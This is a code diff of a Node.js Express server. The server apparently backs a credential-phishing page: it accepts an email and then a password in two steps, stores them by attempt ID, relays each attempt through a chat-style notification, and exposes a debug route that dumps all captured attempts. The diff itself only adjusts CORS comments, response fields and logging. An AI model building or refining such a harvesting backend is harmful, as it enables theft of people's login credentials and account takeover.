@@ -6,16 +6,14 @@ const { v4: uuidv4 } = require("uuid");
 
 const app = express();
 
-// === CLEAN & WORKING CORS (Express 5 compatible) ===
+// === Simple & Reliable CORS (this usually fixes preflight on Railway) ===
 app.use(cors({
-  origin: '*',
+  origin: '*',                    // Allow Vercel + localhost for now
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization'],
   credentials: true,
   maxAge: 86400
 }));
-
-// No more app.options('*') — cors middleware already handles preflight
 
 app.use(express.json());
 
@@ -70,11 +68,7 @@ app.post("/api/submit-email", async (req, res) => {
     `🔑 ID: \`${attemptId.slice(0, 8)}\``
   );
 
-  res.json({
-    status: "success",
-    message: "Email received. Please enter password.",
-    attemptId,
-  });
+  res.json({ status: "success", attemptId });
 });
 
 // ====================== STEP 2: Submit Password ======================
@@ -103,18 +97,14 @@ app.post("/api/submit-password", async (req, res) => {
   res.json({ status: "success", message: "Done" });
 });
 
-// Debug route
+// Debug (optional)
 app.get("/api/debug", (req, res) => {
   res.json(Array.from(loginAttempts.entries()));
 });
 
-// === Use Railway PORT ===
 const port = process.env.PORT || 3000;
 
 app.listen(port, '0.0.0.0', () => {
   console.log(`🚀 Server running on port ${port}`);
-  console.log("✅ CORS enabled with origin: *");
-  console.log("Endpoints ready:");
-  console.log("   POST /api/submit-email");
-  console.log("   POST /api/submit-password");
+  console.log("✅ CORS enabled (origin: *)");
 });
